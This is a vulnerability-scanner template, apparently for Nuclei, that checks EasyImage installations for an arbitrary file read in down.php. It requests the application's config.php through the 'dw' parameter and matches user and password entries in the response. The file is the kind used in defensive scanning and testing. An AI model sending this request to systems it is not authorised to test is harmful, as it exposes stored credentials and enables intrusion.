http:
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - '''user''=>'
            - '''password''=>'
            - EasyImage
        - part: header
          type: word
          words:
            - text/html
        - status:
            - 200
          type: status
      matchers-condition: and
      method: GET
      path:
        - '{{BaseURL}}/application/down.php?dw=config/config.php'
id: easyimage-downphp-lfi
info:
    author: DhiyaneshDk
    metadata:
        fofa-query: app="EasyImage-简单图床"
        max-request: 1
        verified: true
    name: EasyImage down.php - Arbitrary File Read
    reference:
        - https://github.com/qingchenhh/qc_poc/blob/main/Goby/EasyImage_down.php_file_read.go
    severity: high
    tags:
        - easyimage
        - exposure
        - config
        - EasyImage-简单图床
